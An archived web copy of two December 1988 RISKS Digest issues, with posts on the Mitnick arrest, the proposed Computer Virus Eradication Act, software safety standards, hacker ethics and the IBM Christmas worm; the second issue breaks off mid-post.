<LINK REL="Prev" HREF="/Risks/7.94.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.96.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.94.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.96.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 95</H1>
<H2> Friday 16 December 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Armed with a keyboard and considered dangerous 
</A>
<DD>
<A HREF="#subj1.1">
Rodney Hoffman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Value for money? (Part 2) 
</A>
<DD>
<A HREF="#subj2.1">
Jerry Harper
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  USAF software contractors score poorly 
</A>
<DD>
<A HREF="#subj3.1">
Henry Spencer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Reasoning about software 
</A>
<DD>
<A HREF="#subj4.1">
Nancy Leveson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Hacking the etymology 
</A>
<DD>
<A HREF="#subj5.1">
Nigel Roberts
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  [Shattering revelations] 
</A>
<DD>
<A HREF="#subj6.1">
Shatter
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Armed with a keyboard and considered dangerous
</A>
</H3>
<address>
Rodney Hoffman 
&lt;<A HREF="mailto:Hoffman.es@Xerox.com">
Hoffman.es@Xerox.com
</A>&gt;
</address>
<i>
16 Dec 88 08:13:25 PST (Friday)
</i><PRE>

The 16 Dec 88 'Los Angeles Times' contains this story (excerpts only):

         EX-COMPUTER WHIZ KID HELD ON NEW FRAUD COUNTS
                         By Kim Murphy
  
  Kevin Mitnick was 17 when he first cracked Pacific Bell's computer 
  system, secretly channeling his computer through a pay phone to 
  alter telephone bills, penetrate other computers and steal $200,000 
  worth of data from a San Francisco corporation.  A Juvenile Court 
  judge at the time sentenced Mitnick to six months in a youth facility....
  
  [After his release,] his probation officer found that her phone had 
  been disconnected and the phone company had no record of it.  A 
  judge's credit record at TRW Inc. was inexplicably altered.  Police 
  computer files on the case were accessed from outside.... Mitnick 
  fled to Israel.  Upon his return, there were new charges filed in 
  Santa Cruz, accusing Mitnick of stealing software under development 
  by Microport Systems, and federal prosecutors have a judgment showing 
  Mitnick was convicted on the charge.  There is, however, no record 
  of the conviction in Sant Cruz's computer files.
  
  On Thursday, Mitnick, now 25, was charged in two new criminal complaints
  accusing him of causing $4 million damage to a DEC computer, stealing 
  a highly secret computer security system and gaining access to 
  unauthorized MCI long-distance codes through university computers 
  in L.A. and England.  
  
  U.S. Magistrate ...took the unusual step of ordering [Mitnick] held 
  without bail, ruling that when armed with a keyboard he posed a danger 
  to the community.  "This thing is so massive, we're just running around 
  trying to figure out what he did," said the prosecutor, an Asst. U.S. 
  Atty.  "This person, we believe, is very, very dangerous, and he needs 
  to be detained and kept away from a computer."  LA and FBI Investigators 
  say they are only now beginning to put together a picture of Mitnick 
  and his alleged high-tech escapades.  "He's several levels above what 
  you would characterize as a computer hacker," said Detective James K. 
  Black, head of the LA Police Dept's computer crime unit.  "He started 
  out with a real driving curiosity for computers that went beyond personal
  computers.... He grew with the technology."
  
  Mitnick is to be arraigned on two counts of computer fraud.  The case 
  is believed to be the first in the nation under a federal law that makes 
  it a crime to gain access to an interstate computer network for criminal
  purposes.... Federal prosecutors also obtained a court order restricting
  Mitnick's telephone calls from jail, fearing he might gain access to a 
  computer over the phone lines....

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Re: Computer Virus Eradication Act of 1988   
</A>
</H3>
<address>
Les Earnest 
&lt;<A HREF="mailto:LES@SAIL.Stanford.EDU">
LES@SAIL.Stanford.EDU
</A>&gt;
</address>
<i>
16 Dec 88  0103 PST
</i><PRE>

The note from Don Alvarez &lt;boomer@space.mit.edu&gt; in <A HREF="/Risks/7.91.html">RISKS-7.91</A> gives the
text of proposed legislation that is intended to inhibit certain kinds of
computer crime.  If you look at it only as a protection against skulduggery
then it looks reasonable, but it also seems to prohibit certain plausible
defensive tactics against software piracy.

Suppose that a software developer wishes to protect his program against
theft and happens to know with certainty that the computing environments
of all customers will have a certain property and that those of thieves
may not have that property.  It would be reasonable to have the program
check for the property and, if it is missing, either self-destruct or
malfunction in subtle ways.  (Admittedly there is some risk in doing this,
given all the crazy things that customers do, but with suitable admonitions
this could be a reasonable defensive tactic.  In fact it has been used
in the past.)

The proposed legislation reportedly says:
"(a) Whoever knowingly-
  "(1) inserts into a program for a computer information or commands,
  knowing or having reason to believe that such information or commands
  will cause loss to users of a computer on which such program is run
  or to those who rely on information processed on such computer; and
  "(2) provides such a program to others in circumstances in which those
  others do not know of the insertion or its effects; or attempts to do so,
  shall if any such conduct affects interstate or foreign commerce, be fined
  under this title or imprisoned not more than 10 years, or both."

This wording, as it stands, would appear to make defensive programming of the
type described above illegal.  The problem is that it fails to distinguish
between the interests of legitimate users of programs and those who steal them.

	-Les Earnest

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
 Value for money? (Part 2)
</A>
</H3>
<address>
Jerry Harper 
&lt;<A HREF="mailto:jharper@euroies.UUCP">
jharper@euroies.UUCP
</A>&gt;
</address>
<i>
Tue, 13 Dec 88 20:43:11 GMT
</i><PRE>

Just a week back a note appeared from me citing an Irish Times report of
how our Department of Health spent approximately $67million on a medical
informatics system which was substandard in many respects. A lamentable fact 
of the debacle is the Dept's dogged refusal to accept the advice of a range
of academics concerning inadequacies in the system.  This little anecdote
will impress RISKS readers I hope.  

Shortly, after the contract had been agreed, one of the management 
consultants favouring the system because of its advanced features
had the temerity to ring one of the opposed academics and ask if they
could recommend a good introduction to medical information systems!

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
USAF software contractors score poorly
</A>
</H3>
<address>
&lt;<A HREF="mailto:attcan!utzoo!henry@uunet.UU.NET">
attcan!utzoo!henry@uunet.UU.NET
</A>&gt;
</address>
<i>
Wed, 14 Dec 88 01:39:45 EST
</i><PRE>

&gt;From the Nov 14 Aviation Week &amp; Space Technology (page 103):

	The [USAF] Electronic Systems Div. has developed a new system
	for Air Force source selection boards to use to evaluate
	contractors' software capabilities.  Using a questionnaire,
	companies are ranked from one to five.  Some 84% of the 178
	contractors checked so far rank at the lowest level, with
	chaotic or unpredictable, poorly controlled processes.  Only
	14% ranked at the second level, meaning they could repeat
	previously mastered tasks.  Two percent met the third level
	with well-understood processes.  The processes for the fourth
	level are defined as well-measured and controlled, and for
	the fifth as optimized.  So far no contractor has ranked
	above the third level.

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
reasoning about software
</A>
</H3>
<address>
Nancy Leveson 
&lt;<A HREF="mailto:nancy@sablon.ics.uci.edu">
nancy@sablon.ics.uci.edu
</A>&gt;
</address>
<i>
Fri, 16 Dec 88 11:55:44 -0800
</i><PRE>

I have a somewhat different interpretation of the draft ICAO standard
than Steve.

I originally quoted from a draft standard that included the following:
  &gt; "... [Software] must be developed systematically in such a way that its
  &gt; behavior, under all possible conditions, can be established by logical
  &gt; reasoning (to a level of formality appropriate to the application).

Steve responded with:
 &gt;&gt; It's my opinion that strict enforcement of the above requirement simply
 &gt;&gt; makes the developer liable for errors, but doesn't do much for actually
 &gt;&gt; improving software reliability.  It is unlikely that "all possible 
 &gt;&gt; conditions" can be for[e]seen, let alone provided for.  The problem becomes 
 &gt;&gt; bigger as the complexity of the system increases, to the point where 
 &gt;&gt; exhaustive analysis of a system could take centuries to perform.

One of the most effective ways to increase reliability is to decrease
complexity.  I have seen safety-critical systems where the developers purposely
simplified their systems to make the above reasoning possible.  The results
were highly reliable.  I believe (and have heard those in the field of formal
verification confirm) that one of the advantages of formally verifying software
is that it encourages simplicity in the software design in order to perform the
necessary logical reasoning.

Reasoning about all conditions is currently required for hardware.  System
safety engineers use techniques such as FMECA (Failure Modes, Effects, and
Criticality Analysis, as mentioned in the standard) to accomplish this.  Should
regulatory agencies relax their standards for the software used to replace this
hardware?  Such hardware analyses currently do find many problems that are
fixed before they can cause an accident.

Microwave landing systems are used when visibility does not allow the pilot to
land the plane alone.  Current systems allow landing only when visibility is at
least 200 feet, so the pilot has a chance to abort and go around.  However,
they are now talking about allowing landings where the visibility is zero.
Perhaps we should not be putting trust in these systems if we cannot build them
in such a way that we CAN reason logically about their behavior under all
conditions.

 &gt;&gt; The requirement is essentially that systems be perfect.  That goal has
 &gt;&gt; proven elusive (unattainable?) in all areas of human endeavor.  Extensive
 &gt;&gt; formalism and verification should be required of critical systems, but
 &gt;&gt; requirements for perfect function are inane.  

I don't read the requirement as requiring perfection.  It says that we must
build the software in such a way that we can reason about it under all
conditions, including presumably what happens when there are software errors.
The standards certainly should not imply that failures in such systems are
acceptable.  Would you want a standard involving the safety of commercial
aircraft to require less than perfection?  Extremely high reliability
requirements (e.g., 10^-9 probability of failure over a fixed period of time)
are merely attempts to provide virtual perfection in hardware systems where
failures are random. In fact, it has been written that the FAA 10^-9 figure is
meant to be equivalent to: "is not expected to occur within the total life span
of the whole fleet of the model." [Waterman, "FAA's certification position on
advanced avionics," AIAA Astro. and Aero., May 1978, pp. 49-51]

 &gt;&gt; A better approach would be to require independent performance monitoring 
 &gt;&gt; and evaluation as part of the complete system.  

I agree, but I don't think the standard precludes this; in fact, I read
it as implying the necessity for it.  However, independent performance 
monitoring and evaluation can be flawed and implemented imperfectly also;  
error detection can be quite difficult in many applications.  I would 
feel most comfortable if companies do everything they can to make  
such safety-critical software as good as possible and then provide
safeguards in case they had not been completely successful;  both of 
these things need to be done in order for us to have the maximum confidence 
in our software at our current level of technology. 

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Hacking the etymology
</A>
</H3>
<address>
Nigel Roberts, D-8043 Unterfoehring
&lt;<A HREF="mailto:roberts%untadh.DEC@decwrl.dec.com ">
roberts%untadh.DEC@decwrl.dec.com 
</A>&gt;
</address>
<i>
Tue, 13 Dec 88 07:00:26 PST
</i><PRE>

The recent discussions of the etymology of the terms "hacker", "cracker", 
_et al_ &amp; the recent spirited defence of the activity by one or two 
contributors (at least one of them being a self-confessed "hacker") has 
set me to thinking.

In RISKS &amp; elsewhere, I see a "generation gap" between what, for want of a 
better term, I would describe as the "old-time hackers", who were experimenters,
and the current cyberpunks, the "hackers" of popular mediaspeak, the 
eponymous "shatterers". 

I think this apparent generation gap is fundamental to the discussion. 

The "old-style hackers" (of whom I am vain enough to claim I belong) learned
their computing in the 60s and 70s, often in a university or similar multi-
user environment, where, as often as not, hacking involved programming.

Today's stainless steel rats are much more likely to have discovered 
computers in the home, courtesy of Apple, Commodore or IBM, and started their
"network tourist" activities by purchasing a modem.

The old school (&amp; I include myself here) resents the way the term "hacker" 
has been hi-jacked and is today being used to connotate anti-social activity. 
This is despite the ambiguous roots of the term (described by Weizenbaum
in _Computer Power &amp; Human Reason_).

Today's cyberpunks are computer burglars, who are attempting to justify their 
activities by claiming a common motivation with their arguably less anti-social 
predecessors.

Like any story of generation conflict, there are elements of truth in the claims
of both sides.

It is going to be impossible to prevent the media from using the word "hacker"
in a way that the "old school" dislike. It would almost be easier to claim that
the word "gay" meant "happy, carefree".

But maybe the media and the collective unconscious understand the evolution 
of hackerism better than we do.

For just as there is at least a tiny thread of commonality with the hackers
of old in the network rats of the 80s, and I would say that there was some small
element of today's network rats in the hackers of old.

But of course, there IS a distinction between hacking around a system whose 
sole reason of being is to teach people about computers, and hacking into
systems which are being used for serious business purposes and where outsiders
no right to be. 

That difference is ethical, and has well expounded here in RISKS already.

Seeing as we can't get rid of "hackers" in the popular media, I would like 
to coin the term "punk hackers" (an abbreviation of 'cyberpunk hackers')
to describe their anti-social activities.

It seems to fit only too well, just like "punk rock" is rock music with 
swearing &amp; spitting at the audience. 

And using it would let us "old hackers" keep our self-respect!

	Nigel Roberts,  	Munich, W. Germany.

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
[Shattering revelations]
</A>
</H3>
<address>
Shatter
&lt;<A HREF="mailto:unido!altger!Shatter@uunet.UU.NET ">
unido!altger!Shatter@uunet.UU.NET 
</A>&gt;
</address>
<i>
15 Dec 88 04:58:42 MEZ (Thu)
</i><PRE>

First of all I would like to thank all the ppl who gave me feedback on my prev-
ious contribution to risks it has on the whole been quite positive :-)
[You will now have gathered that I have gone legit as I am now too well known
to continue with active hacking and will have to make do with the odd foray
into the net on highdays and holidays]. But there has been at least one recent contributor who does not seem to get the point that I was trying to make
and s my last effort was knocked up in 10mins I have decided to put a bit more effort into this one.
My previous article [if you can call it that] was not trying to justify anything
but was written to try to point out a major flaw that exists in the IT community
and it is one that should at least show some signs of being rectified in the
near future or more serious attacks on networks such s internet will no
doubt occur.
The contributor who compared modern day hackers to the punk rock musicians
of the 70's obviously has not spent time within the hacker community
in the last 10 to 20 years as if he had he would releise that the sense of
ethics and morality is as strong if not stronger than in his day
and his assumption is like saying all black male teenagers are muggers,
rapists and murderers.[but i wander yet again]
and I would like to say to him am I anyless of a caring,moral and intelligent
human being becoz I learned my craft on a home micro,network of tandy modal 80's
and a modem I made myself? Wot I think we have witnessed in recent issues of risks
is a kind of computer snobbery that does little to promote the spirt of goodwill
and intellectual exchange that should exist within our community [for all our sakes]. Comments have been made that Hackers of today do not inform the owners
of the systems of the holes that exist and in some instances that is true but
I ask you "When those of you who claim to be 'old-time hackers' found a possible
security breach on a machine did you immdiatly go running printout in hand to
the owner of the system?????" I think not the temptation to explore just that little bit further is too great.
and in some cases the administrator is rude and often downright abusive
when a security hole is brought to his attention [sorry I am not sexist the masculine gender is used to mean mankind in general not just the male sex]
Which is often the case on commercial sites[an exparience I myself have
expirienced]
To finish this "article" off i will just make the following points:-
1. Can we please have less of this snobbery that exists
2. Work with the hacking community as much as possible. We will both gain
from the exparience [offer an insentive if nessesary[an account that is open to
all but only usable at nite and has say a MUD on it or even MONEY :-) ]]
3. Work with each other

and finally if anyone has a need for any help with any thing that you
think I can help with then mail me at ...!unido!alter!Shatter and
i will see if I can help.
                                        Shatter

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.94.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.96.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-48</DOCNO>
<DOCOLDNO>IA012-000131-B036-189</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.96.html 128.240.150.127 19970217024610 text/html 22124
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:44:40 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 96</TITLE>
<LINK REL="Prev" HREF="/Risks/7.95.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.97.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.95.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.97.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 96</H1>
<H2> Tuesday 20 December 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Soviets Claim Computer-Virus Shield 
</A>
<DD>
<A HREF="#subj1.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  UNICEF Belated Greetings 
</A>
<DD>
<A HREF="#subj2.1">
David Andrew Segal and Chris Koenigsberg
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Computer Ethics or just Ethics 
</A>
<DD>
<A HREF="#subj3.1">
David Clayton
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Those Who Do Not Learn From History 
</A>
<DD>
<A HREF="#subj4.1">
F. Baube
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: Armed with a keyboard and considered dangerous 
</A>
<DD>
<A HREF="#subj5.1">
F. Baube
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Re: Computer Virus Eradication Act of 1988 
</A>
<DD>
<A HREF="#subj6.1">
David Keegel
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Manslaughter caused by computer error 
</A>
<DD>
<A HREF="#subj7.1">
Herman J. Woltring
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  New EMI Shielding Material 
</A>
<DD>
<A HREF="#subj8.1">
Earl Boebert
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Soviets Claim Computer-Virus Shield 
</A>
</H3>
<address>
Peter Neumann 
&lt;<A HREF="mailto:neumann@csl.sri.com">
neumann@csl.sri.com
</A>&gt;
</address>
<i>
Mon, 19 Dec 1988 13:15:45 PST
</i><PRE>

  The Soviet Union said yesterday that so-called computer viruses have invaded
systems in at least five government-run institutions since August, but Soviet
scientists say they have developed a way to detect known viruses and prevent
serious damage.
  In August 1988, a virus infected 80 computers at the Soviet Academy of
Sciences before it was brought under control 18 hours later.  It was traced to
a group of Soviet and foreign schoolchildren attending the Institute's summer
computer studies program, apparently resulting from the copying of game programs.
  Sergei Abramov of the Soviet Academy of Sciences claims they have developed a
protective system, PC-shield, that protects Soviet computers against known
virus strains.  It has been tested on IBM computers in the Soviet Union.  "This
protective system has no counterpart in the world," he said (although the
details remain a state secret).

[Paraphrase of a UPI item in the San Francisco Chronicle, 19 Dec 88, p. A16]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
UNICEF Belated Greetings
</A>
</H3>
<address>
David Andrew Segal
&lt;<A HREF="mailto:dasegal@brokaw.LCS.MIT.EDU ">
dasegal@brokaw.LCS.MIT.EDU 
</A>&gt;
</address>
<i>
Sun, 18 Dec 88 13:02:52 EST
</i><PRE>

From the New York Times, Saturday, December 17, 1988 

A computer problem has brought frustration instead of glad tidings to hundreds
of people who ordered Unicef Christmas cards through the organization's
toll-free telephone number.  Many orders have been delayed or lost.

"We have a little bug in the system," said Colin J. Rainsbury, vice president
of the greeting-card division ....

Unicef's direct-marketing manager, Laura A. Colassano, said the organization
had processed more than 90,000 orders in the United States for the cards, ...
She said almost 1,000 people had called about missing orders.

TMI Inbound Inc., a telemarketing agency in Omaha, receives orders from
customers who call 800-FOR-KIDS and transmits the orders to BSA-Fulfillment
Service Inc. in Lakewood, N.J., which fills the orders.  "There's a problem
with the computers speaking to each other," Ms. Colassano said.

[info about refunds...]

David Andrew Segal, Laboratory for Computer Science, MIT

    [Also contributed by Chris Koenigsberg &lt;ckk+@andrew.cmu.edu]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
     Computer Ethics or just Ethics
</A>
</H3>
<address>
David Clayton 
&lt;<A HREF="mailto:LCO101@URIACC.BITNET">
LCO101@URIACC.BITNET
</A>&gt;
</address>
<i>
Tue, 20 Dec 88 08:18:38 EST
</i><PRE>

There is a recent book titled "Everything I Need to Know I Learned in
Kindergarten".  I've only read excerpts and this is not a book review but I
thought of the title as I was reading many contributors' comments regarding
ethics for computer users.  What I find interesting is the implicit assumption
that a different (higher? lower? more stringent?  more lenient?) set of ethics
apply to those who by chance or choice work with computers.  Apparently,
because I use a keyboard and stare at a VDT, the rules of right and wrong, the
definitions of proper -vs- improper behavior that were taught me as a child no
longer apply.  For some reason my choice of a profession has somehow rendered
obsolete those rules I (we?) learned in kindergarten about respecting others
and not taking what isn't ours.

We make attempts to wrap common snooping in terms of honor by making claims of
"respecting data" and "exercising the system" to find bugs and point out
weaknesses in design and implementation.  And we ignore or dismiss acts of
thievery and vandalism by faulting the designers and administrators of pilfered
systems.  There is no doubt that systems must be secure, but we don't tear down
the prisons because we can't build thief-proof banks.  Courses in computer
ethics may be an interesting forum for the discussion of ideas but let's not
kid ourselves that these problems are so unique (and by association, we are so
special) that we must be treated differently and so develop a new ethos.

David Clayton; Academic Computing; University of Rhode Island

    The opinions are my own.  I don't know what, or if, the University
    thinks about these things!

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Those Who Do Not Learn From History ..
</A>
</H3>
<address>
"F.Baube" 
&lt;<A HREF="mailto:fbaube@note.nsf.gov">
fbaube@note.nsf.gov
</A>&gt;
</address>
<i>
Mon, 19 Dec 88 18:04:34 -0500
</i><PRE>

Some old mail, from one year ago .. Mr Patterson can hardly be blamed for
not foreseeing what no-one else on the Internet did, either ..

And, what does 1989 have in store for Netland ?

------- Forwarded Message

Date: Mon, 21 Dec 87 15:22:26 EST
From: Ross Patterson &lt;A024012%RUTVM1.BITNET@CUNYVM.CUNY.EDU&gt;
Subject: IBM Christmas Virus

&gt;Subject: IBM Xmas Prank {RISKS 5.79}
&gt;(5) Is the Internet similarly vulnerable ?

    Not to  this one.  It  plays on  several things that  the Internet
doesn't have:

   1) A  large number of IBM  VM/CMS systems.  The program  would only
      run in a CMS environment.  There is no reason one couldn't write
      something similar in any other language, though.

   2) A  suitable file transfer  system.  FTP doesn't apply.   It must
      provide a  way for a user  to receive an unsolicited  file, in a
      runnable form.

   3) A good method of determining  targets.  The CMS NAMES and NETLOG
      files provided an excellent source of information.  I suppose in
      a Unix environment, ".alias" and "/etc/aliases" would be ok, but
      .alias  is  comparatively rare,  while  NAMES  files are  almost
      universal in CMS.

Browsing this message is no fun at all.  Just type Christmas ..

------- End of Forwarded Message

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Re: Armed with a keyboard and considered dangerous
</A>
</H3>
<address>
 "F.Baube" 
&lt;<A HREF="mailto:fbaube@note.nsf.gov">
fbaube@note.nsf.gov
</A>&gt;
</address>
<i>
Mon, 19 Dec 88 12:03:36 -0500
</i><PRE>

Rodney Hoffman (quoting a news article):
&gt; [..] Federal prosecutors also obtained a court order restricting
&gt; Mitnick's telephone calls from jail, fearing he might gain access
&gt; to a computer over the phone lines....

.. and presumably he would whistle at 1200 bps.

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Re: Computer Virus Eradication Act of 1988
</A>
</H3>
<address>
David Keegel
&lt;<A HREF="mailto:munnari!murrumbong.cs.mu.oz.au!djk@uunet.UU.NET ">
munnari!murrumbong.cs.mu.oz.au!djk@uunet.UU.NET 
</A>&gt;
</address>
<i>
Tue, 20 Dec 88 17:11:03 EST
</i><PRE>

In Risks 7.92, Jonathan Sweedler wrote:
] In other words, can I break into any computer I want to and look at
] whatever files I want to, as long as I announce I'm there and don't
] cause any harm?  Why do these laws center on causing harm to computers
] and not just illegal/unauthorized entry?

I think we need to be a bit more careful about what "harm" or "loss" means.
For instance, if someone reads your private files, you can say that you have
lost some of your privacy. If someone infects your computer with a "benign"
worm/virus whose only effect is to use a few kilobytes of disk and some CPU
time, you can still claim loss of processing power (assuming someone was
using the machine).

When taken literally, this could even apply to such things as remote
fingering: information is given to the finger program which causes it to
use CPU time on another system. It seems that this cannot be called "loss"
otherwise by running a non-optimised program I am potentially depriving
others of processing power.

On the other hand, to say that loss means loss of data (files) allows a
{h,cr,sn}acker to run a program that may crash your machine. Is there a
clear dividing line between this and using 100% of the CPU? Where could
we draw such a line?

I believe it _is_ important to avoid making laws which prohibit _all_
unauthorised access. Apart from questions about the fuzziness of the word
"authorised" (eg: who is authorised to use "login"?), the important problem
is that you do not allow people to test your security, without previous
authorisation (try to imagine a one-man, part-time "tiger team" :-).

The possible advantages of "hack attacks" and the like have been covered
before, so consider another facet of this: imagine that Joe User (joe@host)
one day mistypes his login name and discovers, by accident, that jo@host has
no password required. He is dropped into Jo Bloggs' shell, without
authorisation from her. Already he has broken the law.

Now (the interesting part), he is faced with the following dilemma: does he
tell jo@host or root@host of this security problem, and face being charged;
or does he keep his mouth closed about the situation? There is now a
definite DISincentive to informing the sysadmins that jo has no password.

As if this weren't bad enough, imagine the hypothetical law made no
distinction between "unauthorised use" and "harm". Since he has already
broken this law, he may as well play around. For instance, to erase
indications of his presence. Or to see who Jo is, and what she is doing.

Admittedly, this is a contrived situation which is highly unlikely in
practice, but the point is that it is possible to use someone else's
account, with absolutely _no_ malicious intent and yet become a criminal.
A more realistic example is the person who is bored waiting for a print-out,
and tries a few &lt;user,password&gt; combinations, or someone exploring some
outside system to see what they can find out about it.

I contend that any legislation must not only charge the guilty, but also
avoid charging the innocent.

		David Keegel    (djk%munnari.oz.au@uunet)
   "Flattery will get you nowhere, unless someone else does it to you"

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
 Manslaughter caused by computer error
</A>
</H3>
<address>

&lt;<A HREF="mailto:WWTMHJW@HEITUE5.BITNET">
WWTMHJW@HEITUE5.BITNET
</A>&gt;
</address>
<i>
Mon, 19 Dec 88 18:04 N
</i><PRE>

* * * Software bugs and copyright -- is the author a (re)liable owner? * * *

Six years ago, the Dutch journal Computable reported a case of manslaughter,
attempted manslaughter, and attempted suicide in Western Germany caused by a
computer error.

A print-out error caused a medical insurer to convince a 54-year old woman
that she suffered from a fatal form of syphilis, and that she had transmitted
the disease to her children; in panick, she strangled her 15-year old daughter
and tried to kill her 13-year old son.  The boy escaped, and succeeded in
